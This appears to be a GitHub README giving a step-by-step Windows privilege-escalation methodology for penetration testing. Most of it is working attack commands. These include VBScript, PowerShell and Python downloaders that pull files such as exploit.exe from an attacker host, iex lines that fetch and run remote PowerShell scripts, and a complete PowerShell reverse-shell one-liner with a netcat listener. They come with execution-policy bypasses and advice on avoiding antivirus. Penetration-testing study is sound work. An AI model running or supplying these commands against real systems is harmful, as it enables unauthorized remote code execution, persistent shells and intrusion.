# Windows-Privilege-Escalation
Here is my step-by-step windows privlege escalation methodology. This guide assumes you are starting with a very limited shell like a webshell, netcat reverse shell or a remote telnet connection. 

## First things first
Do some basic enumeration to figure out who we are, what OS this is, what privs we have and what patches have been installed.

```
whoami
net user <username>
systeminfo
net config Workstation 
net users 
```

## Uploading files to the Windows machine  
Sometimes we will want to upload a file to the Windows machine in order to speed up our enumeration or to privilege escalate.  Often you will find that uploading files is not needed in many cases if you are able to execute PowerShell that is hosted on a remote webserver (we will explore this more in the upgrading Windows Shell, Windows Enumeration and Windows Exploits sections).  Uploading files increased the chances of being detected by antivirus and leaves unnecssary data trail behind. 
We will look at 4 ways of uploading files to a remote Windows machine from Kali Linux:  
1. VBScript HTTP Downloader
2. PowerShell HTTP Downloader
3. Python HTTP Downloader
4. FTP Downloader

Most of these will require that we create a simple local webserver on our Kali box to sevre the files (NOTE: I have had issues running this command within TMUX for whatever reason... so dont run it in TMUX).
I like to use the Python Simple HTTP Server:
```
root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m SimpleHTTPServer 80
```
Or the Python pyftpdlib FTP Server (again don't run from TMUX):
```
apt-get install python-pyftpdlib
root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m pyftpdlib -p 21
```

### Uploading Files with VBScript  
First lets test to see if we can run VBScript  
```
echo WScript.StdOut.WriteLine "Yes we can run vbscript!" > testvb.vbs
```
Now we run it to see the results:  
```
cscript testvb.vbs
```
If you see the following message, we are good to go with VBScript!:  
```
C:\Users\Test>cscript testvb.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

Yes we can run vbscript!
```
If you see the following messages, you should move on to PowerShell:  
```
C:\temp>cscript testvb.vbs
This program is blocked by group policy. For more information, contact your system administrator.
C:\temp>testvb.vbs
Access is denied.
```

Now we can create a very simple downloader script by copying and pasting this single line of code into your windows commandline. I have tried to create a VBS script to download files from a remote webserver with the least possible number of lines of VBS code and I believe this is it.
If Windows is an older version of windows (Windows 8 or Server 2012 and below) use the following script:
```
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
```
If Windows is a newer version (Windows 10 or Server 2016), try the following code:
```
echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
```

Now try to download a file to the local path:  
```
cscript dl.vbs "http://10.10.10.10/archive.zip"
```

### Uploading Files with PowerShell  

Test to see if we can run Powershell:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "get-host"
```

Test to see if we can run Powershell Version 2:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$PSVersionTable"
```

Try to download a file from a remote server to the windows temp folder:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"

```

### Uploading Files with Python
Sometimes a Windows machine will have development tools like Python installed.
Check for python
```
python -h
```

Download a file using Python:
```
python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.10.10/cat.jpg', 'C:\\Users\\Public\\Downloads\\cat.jpg');"
```

### Uploading Files with FTP
After running the python ftp lib on (`python -m pyftpdlib -p 21`) on Kali, you can try connecting using the windows FTP client:
```
C:\Users\pwnd>ftp 10.10.10.10
Connected to 10.10.10.10
220 pyftpdlib 1.5.3 ready.
User (10.10.15.31:(none)): anonymous
331 Username ok, send password.
Password: anonymous

230 Login successful.                                                                                                                      
ftp> ls                                                                                                                                 
dir                                                                                                                                       
421 Active data channel timed out.                                                                                                       
```
If you are seeing a 421 timeout when you try to send a command it is likely because your connection is being blocked by the windows firewall. The Windows command-line ftp.exe supports the FTP active mode only. In the active mode, the server has to connect back to the client to establish data connection for a file transfer. 

You can check to see if the remote machine has Winscp.exe installed. Winscp is capable of connecting to an FTP server using passive mode and will not be blocked by the firewall.

## Upgrading your Windows Shell
You might find that you are connected with a limited shell such as a Web shell, netcat shell or Telnet connection that simply is not cutting it for you. Here are a few oneliners you can use to upgrade your shell:

### Upgrade Shell with PowerShell Nishang
Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetraion Tests. The scripts are written on the basis of requirement by the author during real Penetration Tests.

```bash
root@kali:~/test# git clone https://github.com/samratashok/nishang.git                                                  
Cloning into 'nishang'...
remote: Enumerating objects: 1612, done.
remote: Total 1612 (delta 0), reused 0 (delta 0), pack-reused 1612
Receiving objects: 100% (1612/1612), 5.87 MiB | 6.62 MiB/s, done.
Resolving deltas: 100% (1010/1010), done.
root@kali:~/test# cd nishang/
root@kali:~/test/nishang# cd Shells/
root@kali:~/test/nishang/Shells# echo Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 >> Invoke-PowerShellTcp.ps1
root@kali:~/test/nishang/Shells# python -m SimpleHTTPServer 80
```
Now open up a netcat listener on Kali:
```bash
nc -nlvp 4444
```
And Execute the remote powershell script hosted on your Kali SimpleHTTPServer 
```cmd
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"
```

### Upgrade Windows Command Line with a Powershell One-liner Reverse Shell:  
You can run this oneliner from the remote Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
```

### Upgrading using Netcat for Windows
Sometimes it is helpful to create a new Netcat session from an existed limited shell, webshell or unstable (short lived) remote shell.



# Windows Enumeration

### Running Sherlock
Sherlock is a powershell library with a number of privledge escalation checkers built in. 
We can stage and run sherlock on a remote http server so the file never needs to hit the remote server's HDD.  
```bash
root@kali:~test# git clone https://github.com/rasta-mouse/Sherlock.git
Cloning into 'Sherlock'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 75 (delta 0), reused 2 (delta 0), pack-reused 72
Unpacking objects: 100% (75/75), done.
root@kali:~test# cd Sherlock/
root@kali:~test/Sherlock# ls
LICENSE  README.md  Sherlock.ps1
root@kali:~test/Sherlock# echo Find-AllVulns >> Sherlock.ps1
root@kali:~test/Sherlock# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```
Now we can run this from the remote Windows CMD shell:  
```cmd
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Sherlock.ps1'))"
```
Or from a Windows Powershell:
```powershell
IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')
```

### Running Mimicatz

## 

*Easy*

**Passwords**
Passwords can be one of the easiest methods of privledge escalation and there are some tools that can help with this process.


**CopyAndPasteFileDownloader.bat**

Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line)

**CopyAndPasteEnum.bat**

No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial).
Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report

**enumeration.md** 

Basic notes on Windows Enumeration from the OSCP.

**windows_recon.bat**

An uploadable batch file for performing basic windows enumeration.


**References**  
https://medium.com/@hakluke  
https://daya.blog/2018/01/06/windows-privilege-escalation/  
https://pentestlab.blog/2017/04/19/stored-credentials/  
https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/  
https://www.abatchy.com/
https://gist.github.com/egre55
https://github.com/egre55/ultimate-file-transfer-list



